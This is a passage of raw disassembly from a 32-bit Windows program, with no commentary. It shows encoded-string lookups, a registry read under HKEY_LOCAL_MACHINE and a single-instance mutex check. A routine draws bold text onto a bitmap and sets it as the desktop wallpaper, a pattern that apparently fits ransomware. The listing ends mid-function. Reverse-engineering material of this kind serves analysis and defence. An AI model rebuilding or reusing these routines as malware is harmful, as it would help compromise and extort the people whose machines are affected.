  406df9:	57                   	push   %edi
  406dfa:	8d 44 24 14          	lea    0x14(%esp),%eax
  406dfe:	50                   	push   %eax
  406dff:	a1 80 b2 41 00       	mov    0x41b280,%eax
  406e04:	6a 16                	push   $0x16
  406e06:	e8 45 bb ff ff       	call   0x402950
  406e0b:	8b 94 24 24 02 00 00 	mov    0x224(%esp),%edx
  406e12:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  406e16:	51                   	push   %ecx
  406e17:	8b f0                	mov    %eax,%esi
  406e19:	a1 80 b2 41 00       	mov    0x41b280,%eax
  406e1e:	52                   	push   %edx
  406e1f:	e8 2c bb ff ff       	call   0x402950
  406e24:	85 f6                	test   %esi,%esi
  406e26:	8b 3d 8c 80 40 00    	mov    0x40808c,%edi
  406e2c:	8b 2d 90 80 40 00    	mov    0x408090,%ebp
  406e32:	8b d8                	mov    %eax,%ebx
  406e34:	74 65                	je     0x406e9b
  406e36:	85 db                	test   %ebx,%ebx
  406e38:	74 59                	je     0x406e93
  406e3a:	68 04 01 00 00       	push   $0x104
  406e3f:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  406e43:	50                   	push   %eax
  406e44:	56                   	push   %esi
  406e45:	ff 15 b8 80 40 00    	call   *0x4080b8
  406e4b:	85 c0                	test   %eax,%eax
  406e4d:	74 44                	je     0x406e93
  406e4f:	8d 44 24 18          	lea    0x18(%esp),%eax
  406e53:	66 8b 08             	mov    (%eax),%cx
  406e56:	83 c0 02             	add    $0x2,%eax
  406e59:	66 85 c9             	test   %cx,%cx
  406e5c:	75 f5                	jne    0x406e53
  406e5e:	8b 7c 24 14          	mov    0x14(%esp),%edi
  406e62:	8d 54 24 18          	lea    0x18(%esp),%edx
  406e66:	2b c2                	sub    %edx,%eax
  406e68:	d1 f8                	sar    $1,%eax
  406e6a:	83 e8 01             	sub    $0x1,%eax
  406e6d:	50                   	push   %eax
  406e6e:	e8 3d d1 ff ff       	call   0x403fb0
  406e73:	83 c4 04             	add    $0x4,%esp
  406e76:	56                   	push   %esi
  406e77:	6a 00                	push   $0x0
  406e79:	ff 15 90 80 40 00    	call   *0x408090
  406e7f:	50                   	push   %eax
  406e80:	ff 15 8c 80 40 00    	call   *0x40808c
  406e86:	8b c3                	mov    %ebx,%eax
  406e88:	5f                   	pop    %edi
  406e89:	5e                   	pop    %esi
  406e8a:	5d                   	pop    %ebp
  406e8b:	5b                   	pop    %ebx
  406e8c:	81 c4 10 02 00 00    	add    $0x210,%esp
  406e92:	c3                   	ret
  406e93:	56                   	push   %esi
  406e94:	6a 00                	push   $0x0
  406e96:	ff d5                	call   *%ebp
  406e98:	50                   	push   %eax
  406e99:	ff d7                	call   *%edi
  406e9b:	85 db                	test   %ebx,%ebx
  406e9d:	74 08                	je     0x406ea7
  406e9f:	53                   	push   %ebx
  406ea0:	6a 00                	push   $0x0
  406ea2:	ff d5                	call   *%ebp
  406ea4:	50                   	push   %eax
  406ea5:	ff d7                	call   *%edi
  406ea7:	5f                   	pop    %edi
  406ea8:	5e                   	pop    %esi
  406ea9:	5d                   	pop    %ebp
  406eaa:	33 c0                	xor    %eax,%eax
  406eac:	5b                   	pop    %ebx
  406ead:	81 c4 10 02 00 00    	add    $0x210,%esp
  406eb3:	c3                   	ret
  406eb4:	cc                   	int3
  406eb5:	cc                   	int3
  406eb6:	cc                   	int3
  406eb7:	cc                   	int3
  406eb8:	cc                   	int3
  406eb9:	cc                   	int3
  406eba:	cc                   	int3
  406ebb:	cc                   	int3
  406ebc:	cc                   	int3
  406ebd:	cc                   	int3
  406ebe:	cc                   	int3
  406ebf:	cc                   	int3
  406ec0:	55                   	push   %ebp
  406ec1:	8b ec                	mov    %esp,%ebp
  406ec3:	83 e4 f8             	and    $0xfffffff8,%esp
  406ec6:	81 ec 10 04 00 00    	sub    $0x410,%esp
  406ecc:	53                   	push   %ebx
  406ecd:	55                   	push   %ebp
  406ece:	56                   	push   %esi
  406ecf:	57                   	push   %edi
  406ed0:	8d 44 24 18          	lea    0x18(%esp),%eax
  406ed4:	50                   	push   %eax
  406ed5:	a1 80 b2 41 00       	mov    0x41b280,%eax
  406eda:	6a 10                	push   $0x10
  406edc:	e8 6f ba ff ff       	call   0x402950
  406ee1:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  406ee5:	51                   	push   %ecx
  406ee6:	8b f0                	mov    %eax,%esi
  406ee8:	a1 80 b2 41 00       	mov    0x41b280,%eax
  406eed:	6a 11                	push   $0x11
  406eef:	e8 5c ba ff ff       	call   0x402950
  406ef4:	85 f6                	test   %esi,%esi
  406ef6:	8b f8                	mov    %eax,%edi
  406ef8:	c7 44 24 1c 00 04 00 	movl   $0x400,0x1c(%esp)
  406eff:	00 
  406f00:	74 4b                	je     0x406f4d
  406f02:	85 ff                	test   %edi,%edi
  406f04:	74 47                	je     0x406f4d
  406f06:	8d 54 24 14          	lea    0x14(%esp),%edx
  406f0a:	52                   	push   %edx
  406f0b:	68 19 01 02 00       	push   $0x20119
  406f10:	6a 00                	push   $0x0
  406f12:	56                   	push   %esi
  406f13:	68 02 00 00 80       	push   $0x80000002
  406f18:	ff 15 04 80 40 00    	call   *0x408004
  406f1e:	85 c0                	test   %eax,%eax
  406f20:	75 2b                	jne    0x406f4d
  406f22:	8b 54 24 14          	mov    0x14(%esp),%edx
  406f26:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  406f2a:	50                   	push   %eax
  406f2b:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  406f2f:	51                   	push   %ecx
  406f30:	6a 00                	push   $0x0
  406f32:	6a 00                	push   $0x0
  406f34:	57                   	push   %edi
  406f35:	52                   	push   %edx
  406f36:	ff 15 0c 80 40 00    	call   *0x40800c
  406f3c:	8b d8                	mov    %eax,%ebx
  406f3e:	8b 44 24 14          	mov    0x14(%esp),%eax
  406f42:	50                   	push   %eax
  406f43:	ff 15 08 80 40 00    	call   *0x408008
  406f49:	85 db                	test   %ebx,%ebx
  406f4b:	74 05                	je     0x406f52
  406f4d:	c6 44 24 20 00       	movb   $0x0,0x20(%esp)
  406f52:	85 f6                	test   %esi,%esi
  406f54:	8b 1d 8c 80 40 00    	mov    0x40808c,%ebx
  406f5a:	8b 2d 90 80 40 00    	mov    0x408090,%ebp
  406f60:	74 08                	je     0x406f6a
  406f62:	56                   	push   %esi
  406f63:	6a 00                	push   $0x0
  406f65:	ff d5                	call   *%ebp
  406f67:	50                   	push   %eax
  406f68:	ff d3                	call   *%ebx
  406f6a:	85 ff                	test   %edi,%edi
  406f6c:	74 08                	je     0x406f76
  406f6e:	57                   	push   %edi
  406f6f:	6a 00                	push   $0x0
  406f71:	ff d5                	call   *%ebp
  406f73:	50                   	push   %eax
  406f74:	ff d3                	call   *%ebx
  406f76:	e8 65 f8 ff ff       	call   0x4067e0
  406f7b:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  406f7f:	33 d2                	xor    %edx,%edx
  406f81:	80 39 00             	cmpb   $0x0,(%ecx)
  406f84:	74 35                	je     0x406fbb
  406f86:	83 c1 01             	add    $0x1,%ecx
  406f89:	80 39 00             	cmpb   $0x0,(%ecx)
  406f8c:	74 20                	je     0x406fae
  406f8e:	83 c1 01             	add    $0x1,%ecx
  406f91:	80 39 00             	cmpb   $0x0,(%ecx)
  406f94:	74 1d                	je     0x406fb3
  406f96:	83 c1 01             	add    $0x1,%ecx
  406f99:	80 39 00             	cmpb   $0x0,(%ecx)
  406f9c:	74 1a                	je     0x406fb8
  406f9e:	83 c2 04             	add    $0x4,%edx
  406fa1:	83 c1 01             	add    $0x1,%ecx
  406fa4:	81 fa 00 04 00 00    	cmp    $0x400,%edx
  406faa:	72 d5                	jb     0x406f81
  406fac:	eb 0d                	jmp    0x406fbb
  406fae:	83 c2 01             	add    $0x1,%edx
  406fb1:	eb 08                	jmp    0x406fbb
  406fb3:	83 c2 02             	add    $0x2,%edx
  406fb6:	eb 03                	jmp    0x406fbb
  406fb8:	83 c2 03             	add    $0x3,%edx
  406fbb:	50                   	push   %eax
  406fbc:	8d 4c 14 24          	lea    0x24(%esp,%edx,1),%ecx
  406fc0:	68 04 82 40 00       	push   $0x408204
  406fc5:	51                   	push   %ecx
  406fc6:	ff 15 80 81 40 00    	call   *0x408180
  406fcc:	83 c4 0c             	add    $0xc,%esp
  406fcf:	8d 44 24 20          	lea    0x20(%esp),%eax
  406fd3:	33 d2                	xor    %edx,%edx
  406fd5:	80 38 00             	cmpb   $0x0,(%eax)
  406fd8:	74 35                	je     0x40700f
  406fda:	83 c0 01             	add    $0x1,%eax
  406fdd:	80 38 00             	cmpb   $0x0,(%eax)
  406fe0:	74 20                	je     0x407002
  406fe2:	83 c0 01             	add    $0x1,%eax
  406fe5:	80 38 00             	cmpb   $0x0,(%eax)
  406fe8:	74 1d                	je     0x407007
  406fea:	83 c0 01             	add    $0x1,%eax
  406fed:	80 38 00             	cmpb   $0x0,(%eax)
  406ff0:	74 1a                	je     0x40700c
  406ff2:	83 c2 04             	add    $0x4,%edx
  406ff5:	83 c0 01             	add    $0x1,%eax
  406ff8:	81 fa 00 04 00 00    	cmp    $0x400,%edx
  406ffe:	72 d5                	jb     0x406fd5
  407000:	eb 0d                	jmp    0x40700f
  407002:	83 c2 01             	add    $0x1,%edx
  407005:	eb 08                	jmp    0x40700f
  407007:	83 c2 02             	add    $0x2,%edx
  40700a:	eb 03                	jmp    0x40700f
  40700c:	83 c2 03             	add    $0x3,%edx
  40700f:	8d 44 24 20          	lea    0x20(%esp),%eax
  407013:	e8 d8 d0 ff ff       	call   0x4040f0
  407018:	50                   	push   %eax
  407019:	8d 54 24 24          	lea    0x24(%esp),%edx
  40701d:	52                   	push   %edx
  40701e:	e8 ad f5 ff ff       	call   0x4065d0
  407023:	83 c4 08             	add    $0x8,%esp
  407026:	5f                   	pop    %edi
  407027:	5e                   	pop    %esi
  407028:	5d                   	pop    %ebp
  407029:	5b                   	pop    %ebx
  40702a:	8b e5                	mov    %ebp,%esp
  40702c:	5d                   	pop    %ebp
  40702d:	c3                   	ret
  40702e:	cc                   	int3
  40702f:	cc                   	int3
  407030:	51                   	push   %ecx
  407031:	53                   	push   %ebx
  407032:	56                   	push   %esi
  407033:	8d 44 24 08          	lea    0x8(%esp),%eax
  407037:	50                   	push   %eax
  407038:	a1 80 b2 41 00       	mov    0x41b280,%eax
  40703d:	6a 1d                	push   $0x1d
  40703f:	32 db                	xor    %bl,%bl
  407041:	e8 0a b9 ff ff       	call   0x402950
  407046:	8b f0                	mov    %eax,%esi
  407048:	85 f6                	test   %esi,%esi
  40704a:	75 06                	jne    0x407052
  40704c:	b0 01                	mov    $0x1,%al
  40704e:	5e                   	pop    %esi
  40704f:	5b                   	pop    %ebx
  407050:	59                   	pop    %ecx
  407051:	c3                   	ret
  407052:	56                   	push   %esi
  407053:	6a 01                	push   $0x1
  407055:	6a 00                	push   $0x0
  407057:	ff 15 d0 80 40 00    	call   *0x4080d0
  40705d:	ff 15 04 81 40 00    	call   *0x408104
  407063:	3d b7 00 00 00       	cmp    $0xb7,%eax
  407068:	75 02                	jne    0x40706c
  40706a:	b3 01                	mov    $0x1,%bl
  40706c:	56                   	push   %esi
  40706d:	6a 00                	push   $0x0
  40706f:	ff 15 90 80 40 00    	call   *0x408090
  407075:	50                   	push   %eax
  407076:	ff 15 8c 80 40 00    	call   *0x40808c
  40707c:	5e                   	pop    %esi
  40707d:	8a c3                	mov    %bl,%al
  40707f:	5b                   	pop    %ebx
  407080:	59                   	pop    %ecx
  407081:	c3                   	ret
  407082:	cc                   	int3
  407083:	cc                   	int3
  407084:	cc                   	int3
  407085:	cc                   	int3
  407086:	cc                   	int3
  407087:	cc                   	int3
  407088:	cc                   	int3
  407089:	cc                   	int3
  40708a:	cc                   	int3
  40708b:	cc                   	int3
  40708c:	cc                   	int3
  40708d:	cc                   	int3
  40708e:	cc                   	int3
  40708f:	cc                   	int3
  407090:	b8 0c 82 40 00       	mov    $0x40820c,%eax
  407095:	e8 56 cf ff ff       	call   0x403ff0
  40709a:	f7 d8                	neg    %eax
  40709c:	1b c0                	sbb    %eax,%eax
  40709e:	83 c0 01             	add    $0x1,%eax
  4070a1:	c3                   	ret
  4070a2:	cc                   	int3
  4070a3:	cc                   	int3
  4070a4:	cc                   	int3
  4070a5:	cc                   	int3
  4070a6:	cc                   	int3
  4070a7:	cc                   	int3
  4070a8:	cc                   	int3
  4070a9:	cc                   	int3
  4070aa:	cc                   	int3
  4070ab:	cc                   	int3
  4070ac:	cc                   	int3
  4070ad:	cc                   	int3
  4070ae:	cc                   	int3
  4070af:	cc                   	int3
  4070b0:	51                   	push   %ecx
  4070b1:	8b c2                	mov    %edx,%eax
  4070b3:	66 8b 08             	mov    (%eax),%cx
  4070b6:	83 c0 02             	add    $0x2,%eax
  4070b9:	66 85 c9             	test   %cx,%cx
  4070bc:	75 f5                	jne    0x4070b3
  4070be:	2b c2                	sub    %edx,%eax
  4070c0:	d1 f8                	sar    $1,%eax
  4070c2:	83 e8 01             	sub    $0x1,%eax
  4070c5:	83 f8 05             	cmp    $0x5,%eax
  4070c8:	77 04                	ja     0x4070ce
  4070ca:	32 c0                	xor    %al,%al
  4070cc:	59                   	pop    %ecx
  4070cd:	c3                   	ret
  4070ce:	56                   	push   %esi
  4070cf:	b9 14 82 40 00       	mov    $0x408214,%ecx
  4070d4:	57                   	push   %edi
  4070d5:	bf 05 00 00 00       	mov    $0x5,%edi
  4070da:	2b d1                	sub    %ecx,%edx
  4070dc:	8d 64 24 00          	lea    0x0(%esp),%esp
  4070e0:	0f b7 04 0a          	movzwl (%edx,%ecx,1),%eax
  4070e4:	66 3d 41 00          	cmp    $0x41,%ax
  4070e8:	72 09                	jb     0x4070f3
  4070ea:	66 3d 5a 00          	cmp    $0x5a,%ax
  4070ee:	77 03                	ja     0x4070f3
  4070f0:	83 c0 20             	add    $0x20,%eax
  4070f3:	0f b7 f0             	movzwl %ax,%esi
  4070f6:	0f b7 01             	movzwl (%ecx),%eax
  4070f9:	66 3d 41 00          	cmp    $0x41,%ax
  4070fd:	72 09                	jb     0x407108
  4070ff:	66 3d 5a 00          	cmp    $0x5a,%ax
  407103:	77 03                	ja     0x407108
  407105:	83 c0 20             	add    $0x20,%eax
  407108:	83 c1 02             	add    $0x2,%ecx
  40710b:	83 ef 01             	sub    $0x1,%edi
  40710e:	0f b7 c0             	movzwl %ax,%eax
  407111:	74 05                	je     0x407118
  407113:	66 3b f0             	cmp    %ax,%si
  407116:	74 c8                	je     0x4070e0
  407118:	0f b7 d0             	movzwl %ax,%edx
  40711b:	0f b7 c6             	movzwl %si,%eax
  40711e:	2b c2                	sub    %edx,%eax
  407120:	b8 00 00 00 00       	mov    $0x0,%eax
  407125:	5f                   	pop    %edi
  407126:	0f 94 c0             	sete   %al
  407129:	5e                   	pop    %esi
  40712a:	59                   	pop    %ecx
  40712b:	c3                   	ret
  40712c:	cc                   	int3
  40712d:	cc                   	int3
  40712e:	cc                   	int3
  40712f:	cc                   	int3
  407130:	81 ec 5c 04 00 00    	sub    $0x45c,%esp
  407136:	53                   	push   %ebx
  407137:	55                   	push   %ebp
  407138:	56                   	push   %esi
  407139:	57                   	push   %edi
  40713a:	33 ff                	xor    %edi,%edi
  40713c:	57                   	push   %edi
  40713d:	ff 15 9c 81 40 00    	call   *0x40819c
  407143:	50                   	push   %eax
  407144:	89 44 24 14          	mov    %eax,0x14(%esp)
  407148:	ff 15 48 80 40 00    	call   *0x408048
  40714e:	8b 1d 64 80 40 00    	mov    0x408064,%ebx
  407154:	8b f0                	mov    %eax,%esi
  407156:	6a 08                	push   $0x8
  407158:	56                   	push   %esi
  407159:	ff d3                	call   *%ebx
  40715b:	6a 0a                	push   $0xa
  40715d:	56                   	push   %esi
  40715e:	8b e8                	mov    %eax,%ebp
  407160:	ff d3                	call   *%ebx
  407162:	3b ef                	cmp    %edi,%ebp
  407164:	8b d8                	mov    %eax,%ebx
  407166:	0f 84 07 02 00 00    	je     0x407373
  40716c:	3b df                	cmp    %edi,%ebx
  40716e:	0f 84 ff 01 00 00    	je     0x407373
  407174:	8b 44 24 10          	mov    0x10(%esp),%eax
  407178:	53                   	push   %ebx
  407179:	55                   	push   %ebp
  40717a:	50                   	push   %eax
  40717b:	ff 15 44 80 40 00    	call   *0x408044
  407181:	50                   	push   %eax
  407182:	56                   	push   %esi
  407183:	89 44 24 20          	mov    %eax,0x20(%esp)
  407187:	ff 15 4c 80 40 00    	call   *0x40804c
  40718d:	a1 80 b2 41 00       	mov    0x41b280,%eax
  407192:	8d 4c 24 54          	lea    0x54(%esp),%ecx
  407196:	51                   	push   %ecx
  407197:	6a 3a                	push   $0x3a
  407199:	e8 b2 b7 ff ff       	call   0x402950
  40719e:	57                   	push   %edi
  40719f:	6a 01                	push   $0x1
  4071a1:	8d 54 24 44          	lea    0x44(%esp),%edx
  4071a5:	52                   	push   %edx
  4071a6:	89 44 24 20          	mov    %eax,0x20(%esp)
  4071aa:	6a 02                	push   $0x2
  4071ac:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4071b0:	50                   	push   %eax
  4071b1:	56                   	push   %esi
  4071b2:	89 7c 24 34          	mov    %edi,0x34(%esp)
  4071b6:	89 7c 24 38          	mov    %edi,0x38(%esp)
  4071ba:	66 89 7c 24 3c       	mov    %di,0x3c(%esp)
  4071bf:	66 89 7c 24 3e       	mov    %di,0x3e(%esp)
  4071c4:	66 89 7c 24 40       	mov    %di,0x40(%esp)
  4071c9:	66 89 7c 24 42       	mov    %di,0x42(%esp)
  4071ce:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  4071d2:	89 5c 24 48          	mov    %ebx,0x48(%esp)
  4071d6:	66 c7 44 24 4c 00 ff 	movw   $0xff00,0x4c(%esp)
  4071dd:	66 89 7c 24 4e       	mov    %di,0x4e(%esp)
  4071e2:	66 89 7c 24 50       	mov    %di,0x50(%esp)
  4071e7:	66 89 7c 24 52       	mov    %di,0x52(%esp)
  4071ec:	89 7c 24 54          	mov    %edi,0x54(%esp)
  4071f0:	c7 44 24 58 01 00 00 	movl   $0x1,0x58(%esp)
  4071f7:	00 
  4071f8:	ff 15 68 81 40 00    	call   *0x408168
  4071fe:	68 ff ff ff 00       	push   $0xffffff
  407203:	56                   	push   %esi
  407204:	ff 15 5c 80 40 00    	call   *0x40805c
  40720a:	6a 01                	push   $0x1
  40720c:	56                   	push   %esi
  40720d:	ff 15 54 80 40 00    	call   *0x408054
  407213:	57                   	push   %edi
  407214:	57                   	push   %edi
  407215:	57                   	push   %edi
  407216:	57                   	push   %edi
  407217:	57                   	push   %edi
  407218:	57                   	push   %edi
  407219:	57                   	push   %edi
  40721a:	57                   	push   %edi
  40721b:	57                   	push   %edi
  40721c:	68 bc 02 00 00       	push   $0x2bc
  407221:	57                   	push   %edi
  407222:	57                   	push   %edi
  407223:	57                   	push   %edi
  407224:	6a 20                	push   $0x20
  407226:	ff 15 40 80 40 00    	call   *0x408040
  40722c:	50                   	push   %eax
  40722d:	56                   	push   %esi
  40722e:	ff 15 4c 80 40 00    	call   *0x40804c
  407234:	b8 67 66 66 66       	mov    $0x66666667,%eax
  407239:	f7 eb                	imul   %ebx
  40723b:	c1 fa 02             	sar    $0x2,%edx
  40723e:	8b ca                	mov    %edx,%ecx
  407240:	c1 e9 1f             	shr    $0x1f,%ecx
  407243:	89 6c 24 4c          	mov    %ebp,0x4c(%esp)
  407247:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  40724b:	03 ca                	add    %edx,%ecx
  40724d:	89 7c 24 44          	mov    %edi,0x44(%esp)
  407251:	89 4c 24 48          	mov    %ecx,0x48(%esp)
  407255:	89 5c 24 50          	mov    %ebx,0x50(%esp)
  407259:	8b c5                	mov    %ebp,%eax
  40725b:	eb 03                	jmp    0x407260
  40725d:	8d 49 00             	lea    0x0(%ecx),%ecx
  407260:	8a 10                	mov    (%eax),%dl
  407262:	83 c0 01             	add    $0x1,%eax
  407265:	84 d2                	test   %dl,%dl
  407267:	75 f7                	jne    0x407260
  407269:	68 05 08 00 00       	push   $0x805
  40726e:	8d 4c 24 48          	lea    0x48(%esp),%ecx
  407272:	51                   	push   %ecx
  407273:	2b c5                	sub    %ebp,%eax
  407275:	83 e8 01             	sub    $0x1,%eax
  407278:	50                   	push   %eax
  407279:	55                   	push   %ebp
  40727a:	56                   	push   %esi
  40727b:	ff 15 98 81 40 00    	call   *0x408198
  407281:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  407285:	e8 16 01 00 00       	call   0x4073a0
  40728a:	3b c7                	cmp    %edi,%eax
  40728c:	89 44 24 14          	mov    %eax,0x14(%esp)
  407290:	0f 84 a5 00 00 00    	je     0x40733b
  407296:	8d 94 24 60 02 00 00 	lea    0x260(%esp),%edx
  40729d:	52                   	push   %edx
  40729e:	68 04 01 00 00       	push   $0x104
  4072a3:	ff 15 ec 80 40 00    	call   *0x4080ec
  4072a9:	8d 44 24 58          	lea    0x58(%esp),%eax
  4072ad:	50                   	push   %eax
  4072ae:	57                   	push   %edi
  4072af:	57                   	push   %edi
  4072b0:	8d 8c 24 6c 02 00 00 	lea    0x26c(%esp),%ecx
  4072b7:	51                   	push   %ecx
  4072b8:	ff 15 f0 80 40 00    	call   *0x4080f0
  4072be:	ba 20 82 40 00       	mov    $0x408220,%edx
  4072c3:	8d 44 24 58          	lea    0x58(%esp),%eax
  4072c7:	bb 04 01 00 00       	mov    $0x104,%ebx
  4072cc:	8d 64 24 00          	lea    0x0(%esp),%esp
  4072d0:	66 39 38             	cmp    %di,(%eax)
  4072d3:	74 08                	je     0x4072dd
  4072d5:	83 c0 02             	add    $0x2,%eax
  4072d8:	83 eb 01             	sub    $0x1,%ebx
  4072db:	75 f3                	jne    0x4072d0
  4072dd:	3b df                	cmp    %edi,%ebx
  4072df:	74 22                	je     0x407303
  4072e1:	0f b7 0a             	movzwl (%edx),%ecx
  4072e4:	66 89 08             	mov    %cx,(%eax)
  4072e7:	83 c0 02             	add    $0x2,%eax
  4072ea:	83 c2 02             	add    $0x2,%edx
  4072ed:	66 3b cf             	cmp    %di,%cx
  4072f0:	74 05                	je     0x4072f7
  4072f2:	83 eb 01             	sub    $0x1,%ebx
  4072f5:	75 ea                	jne    0x4072e1
  4072f7:	3b df                	cmp    %edi,%ebx
  4072f9:	75 08                	jne    0x407303
  4072fb:	66 89 bc 24 5e 02 00 	mov    %di,0x25e(%esp)
  407302:	00 
  407303:	8b 54 24 18          	mov    0x18(%esp),%edx
  407307:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40730b:	56                   	push   %esi
  40730c:	52                   	push   %edx
  40730d:	8d 44 24 60          	lea    0x60(%esp),%eax
  407311:	50                   	push   %eax
  407312:	8b c3                	mov    %ebx,%eax
  407314:	e8 a7 01 00 00       	call   0x4074c0
  407319:	83 c4 0c             	add    $0xc,%esp
  40731c:	6a 03                	push   $0x3
  40731e:	8d 4c 24 5c          	lea    0x5c(%esp),%ecx
  407322:	51                   	push   %ecx
  407323:	57                   	push   %edi
  407324:	6a 14                	push   $0x14
  407326:	ff 15 94 81 40 00    	call   *0x408194
  40732c:	53                   	push   %ebx
  40732d:	57                   	push   %edi
  40732e:	ff 15 90 80 40 00    	call   *0x408090
  407334:	50                   	push   %eax
  407335:	ff 15 8c 80 40 00    	call   *0x40808c
  40733b:	55                   	push   %ebp
  40733c:	57                   	push   %edi
  40733d:	ff 15 90 80 40 00    	call   *0x408090
  407343:	50                   	push   %eax
  407344:	ff 15 8c 80 40 00    	call   *0x40808c
  40734a:	8b 54 24 18          	mov    0x18(%esp),%edx
  40734e:	52                   	push   %edx
  40734f:	ff 15 50 80 40 00    	call   *0x408050
  407355:	56                   	push   %esi
  407356:	ff 15 58 80 40 00    	call   *0x408058
  40735c:	8b 44 24 10          	mov    0x10(%esp),%eax
  407360:	50                   	push   %eax
  407361:	57                   	push   %edi
  407362:	ff 15 90 81 40 00    	call   *0x408190
  407368:	5f                   	pop    %edi
  407369:	5e                   	pop    %esi
  40736a:	5d                   	pop    %ebp
  40736b:	5b                   	pop    %ebx
  40736c:	81 c4 5c 04 00 00    	add    $0x45c,%esp
  407372:	c3                   	ret
  407373:	56                   	push   %esi
  407374:	ff 15 58 80 40 00    	call   *0x408058
  40737a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40737e:	51                   	push   %ecx
  40737f:	57                   	push   %edi
  407380:	ff 15 90 81 40 00    	call   *0x408190
  407386:	5f                   	pop    %edi
  407387:	5e                   	pop    %esi
  407388:	5d                   	pop    %ebp
  407389:	5b                   	pop    %ebx
  40738a:	81 c4 5c 04 00 00    	add    $0x45c,%esp
  407390:	c3                   	ret
  407391:	cc                   	int3
  407392:	cc                   	int3
  407393:	cc                   	int3
  407394:	cc                   	int3
  407395:	cc                   	int3
  407396:	cc                   	int3
  407397:	cc                   	int3
  407398:	cc                   	int3
  407399:	cc                   	int3
  40739a:	cc                   	int3
  40739b:	cc                   	int3
  40739c:	cc                   	int3
  40739d:	cc                   	int3
  40739e:	cc                   	int3
  40739f:	cc                   	int3
  4073a0:	83 ec 1c             	sub    $0x1c,%esp
  4073a3:	53                   	push   %ebx
  4073a4:	56                   	push   %esi
  4073a5:	8d 44 24 08          	lea    0x8(%esp),%eax
  4073a9:	50                   	push   %eax
  4073aa:	6a 18                	push   $0x18
  4073ac:	51                   	push   %ecx
  4073ad:	ff 15 60 80 40 00    	call   *0x408060
  4073b3:	85 c0                	test   %eax,%eax
  4073b5:	75 06                	jne    0x4073bd
  4073b7:	5e                   	pop    %esi
  4073b8:	5b                   	pop    %ebx
  4073b9:	83 c4 1c             	add    $0x1c,%esp
  4073bc:	c3                   	ret
  4073bd:	8b 54 24 1a          	mov    0x1a(%esp),%edx
  4073c1:	0f af 54 24 18       	imul   0x18(%esp),%edx
  4073c6:	0f b7 c2             	movzwl %dx,%eax
  4073c9:	66 3d 01 00          	cmp    $0x1,%ax
  4073cd:	75 0a                	jne    0x4073d9
  4073cf:	bb 01 00 00 00       	mov    $0x1,%ebx
  4073d4:	e9 c2 00 00 00       	jmp    0x40749b
  4073d9:	66 3d 04 00          	cmp    $0x4,%ax
  4073dd:	77 0a                	ja     0x4073e9
  4073df:	bb 04 00 00 00       	mov    $0x4,%ebx
  4073e4:	e9 b2 00 00 00       	jmp    0x40749b
  4073e9:	66 3d 08 00          	cmp    $0x8,%ax
  4073ed:	77 0a                	ja     0x4073f9
  4073ef:	bb 08 00 00 00       	mov    $0x8,%ebx
  4073f4:	e9 a2 00 00 00       	jmp    0x40749b
  4073f9:	66 3d 10 00          	cmp    $0x10,%ax
  4073fd:	77 0a                	ja     0x407409
  4073ff:	bb 10 00 00 00       	mov    $0x10,%ebx
  407404:	e9 92 00 00 00       	jmp    0x40749b
  407409:	66 3d 18 00          	cmp    $0x18,%ax
  40740d:	0f 87 83 00 00 00    	ja     0x407496
  407413:	bb 18 00 00 00       	mov    $0x18,%ebx
  407418:	6a 28                	push   $0x28
  40741a:	6a 08                	push   $0x8
  40741c:	ff 15 90 80 40 00    	call   *0x408090
  407422:	50                   	push   %eax
  407423:	ff 15 84 80 40 00    	call   *0x408084
  407429:	8b f0                	mov    %eax,%esi
  40742b:	66 83 fb 18          	cmp    $0x18,%bx
  40742f:	c7 06 28 00 00 00    	movl   $0x28,(%esi)
  407435:	8b 44 24 0c          	mov    0xc(%esp),%eax
  407439:	89 46 04             	mov    %eax,0x4(%esi)
  40743c:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  407440:	89 4e 08             	mov    %ecx,0x8(%esi)
  407443:	66 8b 54 24 18       	mov    0x18(%esp),%dx
  407448:	66 89 56 0c          	mov    %dx,0xc(%esi)
  40744c:	66 8b 44 24 1a       	mov    0x1a(%esp),%ax
  407451:	66 89 46 0e          	mov    %ax,0xe(%esi)
  407455:	73 0c                	jae    0x407463
  407457:	ba 01 00 00 00       	mov    $0x1,%edx
  40745c:	8a cb                	mov    %bl,%cl
  40745e:	d3 e2                	shl    %cl,%edx
  407460:	89 56 20             	mov    %edx,0x20(%esi)
  407463:	0f b7 c3             	movzwl %bx,%eax
  407466:	0f af 46 04          	imul   0x4(%esi),%eax
  40746a:	83 c0 1f             	add    $0x1f,%eax
  40746d:	83 e0 e0             	and    $0xffffffe0,%eax
  407470:	99                   	cltd
  407471:	83 e2 07             	and    $0x7,%edx
  407474:	03 c2                	add    %edx,%eax
  407476:	c1 f8 03             	sar    $0x3,%eax
  407479:	0f af 46 08          	imul   0x8(%esi),%eax
  40747d:	89 46 14             	mov    %eax,0x14(%esi)
  407480:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  407487:	c7 46 24 00 00 00 00 	movl   $0x0,0x24(%esi)
  40748e:	8b c6                	mov    %esi,%eax
  407490:	5e                   	pop    %esi
  407491:	5b                   	pop    %ebx
  407492:	83 c4 1c             	add    $0x1c,%esp
  407495:	c3                   	ret
  407496:	bb 20 00 00 00       	mov    $0x20,%ebx
  40749b:	b8 01 00 00 00       	mov    $0x1,%eax
  4074a0:	8a cb                	mov    %bl,%cl
  4074a2:	d3 e0                	shl    %cl,%eax
  4074a4:	8d 04 85 28 00 00 00 	lea    0x28(,%eax,4),%eax
  4074ab:	85 c0                	test   %eax,%eax
  4074ad:	74 06                	je     0x4074b5
  4074af:	50                   	push   %eax
  4074b0:	e9 65 ff ff ff       	jmp    0x40741a
  4074b5:	33 f6                	xor    %esi,%esi
  4074b7:	e9 6f ff ff ff       	jmp    0x40742b
  4074bc:	cc                   	int3
  4074bd:	cc                   	int3
  4074be:	cc                   	int3
  4074bf:	cc                   	int3
  4074c0:	83 ec 14             	sub    $0x14,%esp
  4074c3:	56                   	push   %esi
